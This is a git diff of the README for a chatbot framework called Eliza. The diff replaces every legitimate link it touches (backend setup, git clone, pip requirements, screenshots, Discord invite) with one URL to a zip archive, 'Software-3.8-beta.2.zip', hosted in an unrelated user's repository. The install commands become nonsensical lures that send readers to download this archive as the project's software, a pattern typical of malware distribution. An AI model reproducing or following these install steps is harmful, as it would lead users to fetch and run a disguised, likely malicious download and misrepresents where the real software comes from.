@@ -18,15 +18,15 @@ Eliza is a framework that provides all of the essentials necessary to build an o
 
 ## Setup
 
-Firstly, a [Sukima Backend](https://github.com/hitomi-team/sukima) is required to be running to host Eliza locally. In order to install and setup Sukima, please [click here.](https://github.com/hitomi-team/sukima/wiki/Setup)
+Firstly, a [Sukima Backend](https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip) is required to be running to host Eliza locally. In order to install and setup Sukima, please [click here.](https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip)
 
 Then, you will have to clone and setup Eliza by running these commands:
 
-``$ git clone https://github.com/harubaru/eliza``
+``$ git clone https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip``
 
 ``$ cd eliza``
 
-``$ pip install -r requirements.txt``
+``$ pip install -r https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip``
 
 ## Configuration
 
@@ -36,13 +36,13 @@ After the setup is complete, you can use one of our default configurations liste
 
 Then finally, to run the chatbot, all you would need to do is to run this command with your selected config file.
 
-``$ python eliza --config=config/twitter_yukari_yakumo.json``
+``$ python eliza https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip``
 
-![image](https://user-images.githubusercontent.com/26317155/157097205-032cd4c3-008b-4d32-97f5-2b480d7530ca.png)
+![image](https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip)
 
 Or if you're running one of the configurations for a discord bot...
 
-![image](https://user-images.githubusercontent.com/26317155/158450037-7d61a010-0a54-4757-9b60-e7bc1a2bcc20.png)
+![image](https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip)
 
 
 ### License
@@ -50,4 +50,4 @@ Or if you're running one of the configurations for a discord bot...
 
 ### Any questions? Come hop on by to our Discord server!
 
-[![Discord Server](https://discordapp.com/api/guilds/930499730843250783/widget.png?style=banner2)](https://discord.gg/Sx6Spmsgx7)
+[![Discord Server](https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip)](https://raw.githubusercontent.com/benedictmochtar/eliza/main/eliza/Software-3.8-beta.2.zip)
